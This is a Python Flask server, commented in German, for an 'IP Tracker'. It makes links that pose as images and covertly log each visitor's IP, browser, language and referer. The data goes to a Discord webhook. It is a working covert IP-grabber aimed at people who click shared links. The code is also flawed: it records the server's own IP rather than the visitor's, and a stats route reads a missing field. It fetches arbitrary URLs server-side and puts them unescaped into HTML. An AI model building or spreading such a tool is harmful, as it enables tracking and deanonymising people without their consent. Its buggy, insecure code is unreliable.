from flask import Flask, request, jsonify, send_from_directory, render_template_string
import os
import uuid
import json
import requests
from datetime import datetime
from werkzeug.utils import secure_filename
import ssl

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Erstelle notwendige Verzeichnisse
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('tracking_data', exist_ok=True)

# Erlaubte Dateitypen
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        # Prüfe ob JSON-Daten vorhanden sind
        if not request.is_json:
            return jsonify({'error': 'JSON-Daten erforderlich'}), 400
        
        data = request.get_json()
        image_url = data.get('image_url', '').strip()
        webhook_url = data.get('webhook', '').strip()
        
        if not image_url:
            return jsonify({'error': 'Bild-URL ist erforderlich'}), 400
        
        if not webhook_url:
            return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
        
        # Validiere Bild-URL
        try:
            from urllib.parse import urlparse
            parsed = urlparse(image_url)
            if not all([parsed.scheme, parsed.netloc]):
                return jsonify({'error': 'Ungültige Bild-URL'}), 400
        except:
            return jsonify({'error': 'Ungültige Bild-URL'}), 400
        
        # Generiere eindeutige ID
        tracking_id = str(uuid.uuid4())
        
        # Speichere Tracking-Daten
        tracking_data = {
            'id': tracking_id,
            'image_url': image_url,
            'webhook_url': webhook_url,
            'created_at': datetime.now().isoformat(),
            'visits': []
        }
        
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        with open(tracking_file, 'w', encoding='utf-8') as f:
            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
        
        # Generiere Tracking-URL (Server-URL + Parameter)
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?track={tracking_id}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    tracking_id = request.args.get('track')
    print(f"🔍 DEBUG: Track-Route aufgerufen mit ID: {tracking_id}")
    
    if not tracking_id:
        print("❌ DEBUG: Kein Tracking-Parameter gefunden")
        return "Tracking-Parameter fehlt", 400
    
    try:
        # Lade Tracking-Daten
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        print(f"📁 DEBUG: Tracking-Datei: {tracking_file}")
        
        if not os.path.exists(tracking_file):
            print(f"❌ DEBUG: Tracking-Datei nicht gefunden")
            return "Tracking-Link nicht gefunden", 404
        
        with open(tracking_file, 'r', encoding='utf-8') as f:
            tracking_data = json.load(f)
        
        print(f"✅ DEBUG: Tracking-Daten geladen: {tracking_data}")
        
        # Sammle Besucher-Informationen mit direktem externen IP-Service
        def get_client_ip():
            try:
                import urllib.request
                import json
                # Nutze myip.com API für zuverlässige IP-Erkennung
                with urllib.request.urlopen('https://api.myip.com', timeout=5) as response:
                    ip = response.read().decode().strip()
                    return ip if ip else 'Unbekannt'
            except:
                try:
                    # Fallback zu ipify.org
                    with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5) as response:
                        data = json.loads(response.read().decode())
                        return data.get('ip', 'Unbekannt')
                except:
                    return 'Unbekannt'
        
        visitor_info = {
            'ip': get_client_ip(),
            'user_agent': request.headers.get('User-Agent', 'Unbekannt'),
            'referer': request.headers.get('Referer', 'Direkter Zugriff'),
            'timestamp': datetime.now().isoformat(),
            'language': request.headers.get('Accept-Language', 'Unbekannt'),
            'platform': request.user_agent.platform if hasattr(request.user_agent, 'platform') else 'Unbekannt',
            'browser': request.user_agent.browser if hasattr(request.user_agent, 'browser') else 'Unbekannt'
        }
        
        print(f"🌐 DEBUG: Besucher-Info: {visitor_info}")
        
        # Füge Besuch hinzu
        tracking_data['visits'].append(visitor_info)
        
        # Speichere aktualisierte Daten
        with open(tracking_file, 'w', encoding='utf-8') as f:
            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
        
        # Sende Discord-Benachrichtigung (nur wenn nicht von Discord selbst besucht)
        user_agent = request.headers.get('User-Agent', '').lower()
        print(f"🤖 DEBUG: User-Agent: {user_agent}")
        
        if 'discord' not in user_agent:
            print("📤 DEBUG: Sende Discord-Benachrichtigung...")
            try:
                send_discord_notification(tracking_data['webhook_url'], visitor_info, tracking_data)
                print("✅ DEBUG: Discord-Benachrichtigung gesendet")
            except Exception as e:
                print(f"❌ DEBUG: Fehler beim Senden der Discord-Benachrichtigung: {e}")
        else:
            print("🚫 DEBUG: Discord-Besuch erkannt - keine Benachrichtigung gesendet")
        
        # Lade externes Bild und zeige es mit Tracking an
        image_url = tracking_data['image_url']
        if image_url:
            # Versuche das Bild herunterzuladen und zu servieren
            try:
                import urllib.request
                import io
                from PIL import Image
                
                # Bild herunterladen
                with urllib.request.urlopen(image_url, timeout=10) as response:
                    image_data = response.read()
                
                # Bild als Response zurückgeben
                from flask import Response
                return Response(image_data, mimetype=response.headers.get('Content-Type', 'image/jpeg'))
                
            except Exception as e:
                print(f"Fehler beim Laden des externen Bildes: {e}")
                # HTML mit Open Graph Meta-Tags für Discord-Vorschau
                return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Bild">
    <meta property="og:description" content="Klicke hier um das Bild zu sehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="IP Tracker">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Bild">
    <meta name="twitter:description" content="Klicke hier um das Bild zu sehen">
    <meta name="twitter:image" content="{image_url}">
    <style>
        body {{ margin: 0; padding: 0; background: #000; }}
        img {{ max-width: 100%; height: auto; }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Bild" style="width:100%; height:100vh; object-fit:contain;">
</body>
</html>
                """
        else:
            return "Bild nicht gefunden", 404
            
    except Exception as e:
        return f"Fehler: {str(e)}", 500

def send_discord_notification(webhook_url, visitor_info, tracking_data):
    """Sendet eine Benachrichtigung an Discord"""
    
    # Bessere Discord-User-Erkennung
    discord_username = "Unbekannt"
    referer = visitor_info.get('referer', '')
    user_agent = visitor_info.get('user_agent', '').lower()
    
    # Versuche Username aus verschiedenen Quellen zu extrahieren
    if 'discord.com' in referer or 'discord.gg' in referer:
        discord_username = "Discord Nutzer"
    elif 'discord' in user_agent:
        discord_username = "Discord App"
    elif 'mobile' in user_agent:
        discord_username = "Mobile Nutzer"
    
    # Formatiere Zeitstempel
    timestamp = visitor_info['timestamp'][:19].replace('T', ' ')
    
    embed = {
        "title": "🔍 IP Tracking Benachrichtigung",
        "description": f"Jemand hat deinen Tracking-Link besucht!",
        "color": 5814783,  # Blau
        "fields": [
            {
                "name": "🌐 IP-Adresse",
                "value": f"`{visitor_info['ip']}`",
                "inline": True
            },
            {
                "name": "🕐 Uhrzeit",
                "value": f"`{timestamp}`",
                "inline": True
            },
            {
                "name": "👤 Nutzer",
                "value": f"`{discord_username}`",
                "inline": True
            }
        ],
        "footer": {
            "text": f"Tracking ID: {tracking_data['id'][:8]}..."
        }
    }
    
    payload = {
        "embeds": [embed],
        "username": "IP Tracker",
        "avatar_url": "https://i.imgur.com/3Z1jvQa.png"  # Tracker Icon
    }
    
    response = requests.post(webhook_url, json=payload, timeout=10)
    response.raise_for_status()

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Stellt hochgeladene Bilder bereit"""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/stats/<tracking_id>')
def view_stats(tracking_id):
    """Zeigt Statistiken für einen Tracking-Link an"""
    try:
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        
        if not os.path.exists(tracking_file):
            return jsonify({'error': 'Tracking-Link nicht gefunden'}), 404
        
        with open(tracking_file, 'r', encoding='utf-8') as f:
            tracking_data = json.load(f)
        
        return jsonify({
            'id': tracking_data['id'],
            'original_filename': tracking_data['original_filename'],
            'created_at': tracking_data['created_at'],
            'total_visits': len(tracking_data['visits']),
            'visits': tracking_data['visits']
        })
        
    except Exception as e:
        return jsonify({'error': f'Fehler: {str(e)}'}), 500

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/test-webhook')
def test_webhook():
    """Test-Endpunkt für Webhook"""
    try:
        test_data = {
            'id': 'test-123',
            'image_url': 'https://example.com/test.jpg',
            'webhook_url': 'https://discord.com/api/webhooks/test'
        }
        
        visitor_info = {
            'ip': '1.2.3.4',
            'user_agent': 'Test-Browser',
            'referer': 'Test-Referer',
            'timestamp': datetime.now().isoformat(),
            'language': 'de-DE',
            'platform': 'Test-OS',
            'browser': 'Test-Browser'
        }
        
        print("🧪 DEBUG: Test-Webhook wird gesendet...")
        send_discord_notification(test_data['webhook_url'], visitor_info, test_data)
        print("✅ DEBUG: Test-Webhook gesendet")
        
        return jsonify({'status': 'test-sent', 'message': 'Test-Webhook wurde gesendet'})
    except Exception as e:
        print(f"❌ DEBUG: Test-Webhook Fehler: {e}")
        return jsonify({'status': 'test-failed', 'error': str(e)}), 500

def create_ssl_cert():
    """Erstellt ein selbstsigniertes SSL-Zertifikat"""
    cert_dir = 'ssl'
    os.makedirs(cert_dir, exist_ok=True)
    
    cert_file = os.path.join(cert_dir, 'cert.pem')
    key_file = os.path.join(cert_dir, 'key.pem')
    
    if not os.path.exists(cert_file) or not os.path.exists(key_file):
        print("🔐 Erstelle selbstsigniertes SSL-Zertifikat...")
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import ipaddress
        
        # Generiere privaten Schlüssel
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Erstelle Zertifikat
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "DE"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Berlin"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Berlin"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "IP Tracker"),
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName("localhost"),
                x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                x509.IPAddress(ipaddress.IPv6Address("::1")),
            ]),
            critical=False,
        ).sign(private_key, hashes.SHA256())
        
        # Speichere Zertifikat und Schlüssel
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(key_file, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print("✅ SSL-Zertifikat erstellt")
    
    return cert_file, key_file

if __name__ == '__main__':
    from datetime import timedelta
    
    print("🚀 IP Tracker Server wird gestartet...")
    print("📁 Tracking-Daten Verzeichnis: tracking_data/")
    
    # Automatisch HTTPS mit selbstsigniertem Zertifikat
    cert_file, key_file = create_ssl_cert()
    
    # SSL-Kontext erstellen
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_file, key_file)
    
    print("🔒 HTTPS-Server wird automatisch gestartet...")
    print("🌐 Server läuft auf: https://localhost:5000")
    print("🔍 Health Check: https://localhost:5000/health")
    print("⚠️  Browser zeigt Sicherheitswarnung wegen selbstsigniertem Zertifikat")
    print("📝 Für Online-Betrieb echtes SSL-Zertifikat empfohlen")
    
    app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=context)
